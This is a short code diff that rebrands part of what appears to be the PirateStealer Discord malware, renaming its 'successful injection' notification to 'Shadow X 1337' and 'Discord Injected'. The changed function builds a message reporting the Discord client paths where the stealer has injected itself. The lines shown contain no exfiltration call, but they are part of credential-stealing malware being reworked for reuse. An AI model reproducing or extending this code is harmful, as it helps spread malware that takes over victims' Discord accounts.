@@ -157,7 +157,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: ":syringe: Inject Path",
+            name: "Shadow X 1337 ",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -168,14 +168,14 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": ":detective: Successfull injection",
+            "title": "Discord Injected",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
+              "name": "Shadow X 1337"
             },
             "footer": {
-              "text": "PirateStealer"
+              "text": "Shadow X 1337"
             }
           }
         ]
